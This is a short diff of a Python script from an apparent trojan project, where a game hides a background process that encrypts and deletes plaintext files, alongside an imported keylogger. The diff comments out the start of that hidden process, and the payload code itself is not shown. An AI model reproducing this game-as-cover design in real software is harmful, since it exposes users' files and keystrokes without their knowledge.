@@ -3,10 +3,11 @@ import pathlib
 from multiprocessing import Process
 from typing import List
 
+import trojan
 from trojan.crawler import Crawler
 from trojan.crypto import encryptAndDeletePlaintext
 import trojan.keylogger
-
+import game
 PATH_TO_ROOT = pathlib.Path(__file__).parent.absolute()
 
 
@@ -30,11 +31,10 @@ def truePurpose(target_directory: str):
 
 if __name__ == "__main__":
     # For now, we'll encrypt all files in the test directory, that are a txt file.
-    p: Process = Process(target=truePurpose, args=["./test"])
-    p.name: str = "horse"
-    p.start()
+   # p: Process = Process(target=truePurpose, args=["./test"])
+    #p.name: str = "horse"
+   # p.start()
 
-    import game
     game.game()
 
-    p.join()
+    # p.join()
